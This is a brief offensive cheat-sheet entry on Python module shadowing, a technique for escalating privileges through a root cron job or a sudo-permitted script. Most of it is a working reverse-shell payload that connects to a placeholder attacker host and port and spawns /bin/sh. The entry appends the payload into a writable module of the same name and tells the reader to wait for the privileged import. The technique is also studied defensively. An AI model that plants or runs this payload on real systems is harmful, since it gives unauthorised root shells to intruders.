# Python Module Shadowing

If a privileged (root cron, sudo-permitted) script does `import <stdlib-or-local-module>` and the directory it runs from — or a directory earlier on `sys.path` — contains a file you can write, plant your own module with that exact name.

```bash
echo 'import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<LHOST>",<LPORT>))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])' >> /writable/path/to/<module-name>.py
# wait for the privileged script to run and import it
```
Check which directories a target script's `import` statements can resolve from (its own directory, `sys.path`, any group-writable library location) — not just an obvious name like a stdlib module.
